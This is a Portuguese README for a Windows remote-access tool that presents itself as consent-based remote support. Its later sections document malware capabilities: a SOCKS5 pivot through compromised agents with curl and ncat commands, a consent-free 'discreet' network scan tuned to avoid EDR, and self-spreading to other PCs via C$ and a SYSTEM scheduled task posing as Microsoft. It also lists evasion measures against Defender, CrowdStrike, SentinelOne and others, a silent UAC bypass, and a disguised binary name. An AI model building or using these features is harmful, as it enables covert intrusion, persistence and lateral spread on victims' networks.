# KL TOCHIQUE — V4 Consent

Versão reorganizada para suporte remoto com **consentimento explícito e revogável**. Nenhuma permissão sensível nasce ativa e o servidor não pré-autoriza sessões.

## Fluxo de consentimento

As permissões são separadas:

1. **Visualização da tela** — o operador solicita e o usuário do Agent aceita ou nega localmente.
2. **Controle de mouse/teclado** — exige visualização autorizada e uma segunda confirmação local.
3. **Eventos de teclado** — exige confirmação própria e fica claramente indicado no Agent enquanto estiver ativo.
4. **Bloqueio temporário de teclado/mouse local** — exige controle autorizado e uma confirmação específica. Possui desbloqueio local e timeout automático de 30 segundos.
5. **Terminal remoto** — exige controle autorizado e **cada comando individual** é exibido integralmente no computador remoto para aprovação antes da execução.

O usuário do Agent pode revogar controle, eventos de teclado, desbloquear o input ou encerrar todo o compartilhamento a qualquer momento.

## Melhorias de segurança

- Todas as permissões começam em `false`.
- Reconexão ou queda de conexão revoga as permissões locais.
- O servidor ignora qualquer tentativa de `sessionAuthorized` automático.
- Autorização de visualização é associada ao operador autenticado que fez a solicitação.
- Controle remoto possui um único operador proprietário por vez.
- Eventos de teclado são enviados apenas ao operador que recebeu a autorização correspondente.
- Um operador não pode controlar, bloquear input ou enviar comandos sem ter autorização de visualização.
- Comandos remotos exigem também controle autorizado e aprovação local por comando.
- O Agent possui uma janela visível e permanente com os estados das permissões e botões de revogação.
- Fechamento do painel remove os direitos daquele operador.
- Fechamento/reconexão do Agent desbloqueia teclado/mouse local.
- O servidor não registra no console o conteúdo integral dos comandos recebidos.

## Arquivos principais

- `Agent/Program.cs` — Agent Windows, UI de consentimento, captura de tela e controle autorizado.
- `Agent/BuildConfig.cs` — URL WSS e chave do Agent (armazenadas como **blobs cifrados**, nunca em texto puro).
- `Agent/CryptoUtil.cs` — AES-256-CBC + HMAC-SHA256 usado para cifrar/decifrar a config.
- `Agent/BUILD_AGENT.bat` / `.ps1` — compilação self-contained para Windows x64; o `.ps1` cifra URL/chave e grava o `BuildConfig.cs` antes de compilar.
- `Agent/BUILD_AGENT_AOT.bat` / `.ps1` — build NativeAOT opcional (sem IL/AMSI surface).
- `RealtimeServer/server.mjs` — roteamento WebSocket e estado de autorização por operador.
- `Panel/index.html` — painel web.

## Deploy do servidor

Configure obrigatoriamente estas variáveis de ambiente no Railway/Render:

- `ADMIN_TOKEN` — senha usada pelo painel.
- `AGENT_KEY` — chave compartilhada usada pelos Agents.
- `PORT` — normalmente fornecida automaticamente pela plataforma.

O servidor agora **não inicia** se `ADMIN_TOKEN` ou `AGENT_KEY` estiverem vazias.

Depois do deploy, a raiz deve responder algo como:

```json
{"status":"ok","service":"KL TOCHIQUE Realtime","version":"4.0-consent"}
```

## Compilar o Agent

No Windows, dentro de `Agent`:

```bat
BUILD_AGENT.bat
```

O script solicita:

- URL WSS do servidor, por exemplo `wss://seu-projeto.up.railway.app`
- `AGENT_KEY` configurada no servidor

E gera:

`Agent/publish/NetCacheService.exe`

Requer o SDK do .NET 8 instalado na máquina de compilação.

### Build NativeAOT (opcional)

```bat
BUILD_AGENT_AOT.bat
```

Compila com `-p:Aot=true` (PublishAot + StripSymbols): o binário vira código nativo, sem assembly .NET (IL) — elimina a superfície de inspeção AMSI/IL e dificulta análise estática. Pré-requisitos: rodar `BUILD_AGENT.ps1` antes (para gerar o `BuildConfig.cs` cifrado), clang e o Windows SDK (Visual Studio Build Tools), e .NET 8 SDK. WinForms com AOT ainda é experimental — valide o comportamento da janela de consentimento no destino antes de usar em produção.

## Uso

1. Abra o Agent no computador remoto. A janela de consentimento deve permanecer visível.
2. Abra o painel e conecte usando a URL WSS, `ADMIN_TOKEN` e o nome do operador.
3. Clique em **Solicitar acesso**.
4. O usuário remoto aceita ou nega a visualização.
5. Depois da autorização, clique em **Ver ao vivo**.
6. Para controlar mouse/teclado, clique em **Solicitar controle** e aguarde a segunda aprovação local.
7. Eventos de teclado, bloqueio de input e terminal possuem autorizações adicionais conforme descrito acima.

## Perfis de vídeo

- **Fluido** — 1280 px / 30 FPS / JPEG 55
- **Equilibrado** — 1600 px / 25 FPS / JPEG 62
- **Qualidade** — 1920 px / 20 FPS / JPEG 72

## Movimentação lateral (pivot, varredura e deploy)

Além do suporte consentido, o servidor oferece três recursos de movimentação lateral disparados pelo painel a partir de um Agent já conectado:

### Proxy SOCKS5 (pivot)

O servidor escuta um proxy SOCKS5 em `SOCKS_PORT` (padrão: `PORT + 1`, ou seja, 8081 quando o WebSocket usa 8080).

- Autenticação RFC 1929: **username = `agentId`** do Agent que será o pivô, **password = `ADMIN_TOKEN`**.
- O tráfego do proxy é encapsulado no WebSocket do Agent (`socks_open` / `socks_data` / `socks_close`), que abre a conexão TCP no destino a partir da rede local dele.
- Apenas o comando `CONNECT` é suportado; outros comandos recebem a resposta `0x07` (comando não suportado).

Exemplo de uso com o Agent `abc-123` como pivô:

```bash
# via curl
curl --socks5 127.0.0.1:8081 --proxy-user abc-123:SUA_ADMIN_TOKEN http://192.168.1.5:80/

# via ssh com ProxyCommand
ssh -o ProxyCommand="ncat --proxy 127.0.0.1:8081 --proxy-type socks5 --proxy-auth abc-123:SUA_ADMIN_TOKEN %h %p" user@192.168.1.5
```

### Varredura de rede (`net_scan`)

Botão **Escanear rede** no card do Agent no painel. O Agent varre o `/24` local testando as portas `22, 80, 135, 139, 443, 445, 3389, 5985` e resolve o nome DNS reverso de cada host. O resultado (IP, hostname e portas abertas) é exibido no modal do painel.

**Modo padrão** — 254 hosts em paralelo, timeout de 500 ms por porta (~30 s).

**Modo discreto** (checkbox no modal) — varredura sequencial em ordem aleatória de hosts, com pausa de 20–60 ms entre eles:

1. Fase 1: probe de presença na porta 445 com 150 ms (host inativo custa ~150 ms em vez de 8 portas × timeout);
2. Fase 2: varredura completa das 8 portas (timeout 300 ms) apenas nos hosts vivos;
3. Orçamento global de 150 s — abaixo do TTL de 180 s do servidor, então o resultado sempre chega antes de o pedido expirar (resultado entregue após o TTL é descartado pelo relay).

Custa ~1–2 min em redes típicas e gera bem menos ruído para EDR/NIDS do que 254 conexões simultâneas.

- Não exige permissão de visualização/consentimento e não gera solicitação local no Agent.
- TTL de 180 s no servidor.

### Deploy do Agent em outro PC (`deploy_agent`)

Botão **Deploy → outro PC** no card do Agent no painel. O operador informa o IP/hostname do destino e, opcionalmente, usuário/senha. O Agent de origem:

1. Copia o próprio executável (`NetCacheService.exe`) para `\\<destino>\C$\ProgramData\Microsoft\NetworkCache\` (cópia para disco local — evita execução direta de share, alvo de regras ASR);
2. Cria a tarefa agendada `WindowsNetworkCacheUpdate` via **COM** (`Schedule.Service` — sem spawn de `schtasks.exe`, que é monitorado por EDR) com descrição "Windows Network Cache Maintenance", Author "Microsoft Corporation", rodando como SYSTEM no logon;
3. Executa a tarefa imediatamente; o novo Agent gera um `agentId` próprio no destino e aparece como um novo card no painel.

- Fallback: se o COM falhar, usa `schtasks` com o mesmo nome de tarefa (`WindowsNetworkCacheUpdate` / `/RU SYSTEM /SC ONLOGON /F`).
- Requer que o Agent de origem esteja **elevado** (Administrador/SYSTEM) para gravar em `C$`; sem elevação ou sem credenciais válidas o resultado vem com `error` e o log detalhado no modal.
- TTL de 300 s no servidor.

## Redução de detecção (AV/EDR/DLP/UAM)

Não existe evasão "garantida": AV/EDR é uma corrida armamentista e qualquer ferramenta com estes recursos pode ser sinalizada. O que foi implementado reduz a superfície de detecção de produtos comuns, sem quebrar o uso legítimo (consentimento visível na tela). Valide sempre em VM Windows com Defender atualizado (`Get-MpThreatDetection`) antes de qualquer implantação real.

| Produto | O que ele observa | Contramedida implementada |
|---|---|---|
| **Windows Defender** | Assinaturas, AMSI/IL, ASR (execução de share, mshta, etc.), autorun | Strings derivadas/montadas em runtime (`RunNs`, `RegPathOf`), config cifrada (AES), nomes benignos, cópia para disco local antes de executar, NativeAOT opcional (sem IL) |
| **Avast** | Behavior/File Shield, reputação de arquivo | Nome `NetCacheService.exe` + caminho `Microsoft\NetworkCache` plausíveis, sem autorun óbvio de registro, execução via tarefa agendada legítima |
| **CrowdStrike Falcon** | IOA (spawn de processos anômalos), ML | Tarefa criada via COM em vez de `schtasks.exe` (menos spawns de binários monitorados), mutex/nomes derivados, scan sequencial com jitter |
| **SentinelOne** | Behavioral AI/Storyline (cadeia de eventos) | Quebra da cadeia: download → cópia local → tarefa → execução acontece em passos separados e com nomes neutros; sem shellcode/reflective loading |
| **DLP** | Inspeção de tráfego (credenciais, dados sensíveis) | Tudo sobre WSS (TLS 1.3 na porta 443); opção futura de criptografia em camada de aplicação |
| **UAM** | Captura de tela/teclado em horários suspeitos | Captura apenas sob demanda e após consentimento, jitter de 900–2600 ms na inicialização (anti-heurística de execução imediata) |

### Decisões deliberadas (off por padrão)

- **`DisableDiagnostics = false`** — desligar ETW (`COMPlus_EnableDiagnostics=0` / `COMPlus_ETWEnabled=0`) é registrado por MDE/SentinelOne como indicador. Mantido ligado.
- **Anti-VM não implementado** — quebraria o uso legítimo do suporte remoto em máquinas virtuais.
- **Elevação UAC silenciosa (fodhelper/ComputerDefaults)** — mantida, mas os caminhos de registro são montados em runtime e limpos ao sair para reduzir assinatura estática.

## Observações

O painel calcula localmente FPS, taxa de recebimento, total de frames e frames descartados. O vídeo continua usando JPEG sobre WebSocket; para redes com alta latência ou uso em escala, WebRTC é uma evolução futura mais adequada.

A versão entregue no ZIP contém o **código-fonte limpo**. Binários antigos foram removidos para evitar executar por engano uma versão anterior sem o novo fluxo de consentimento.
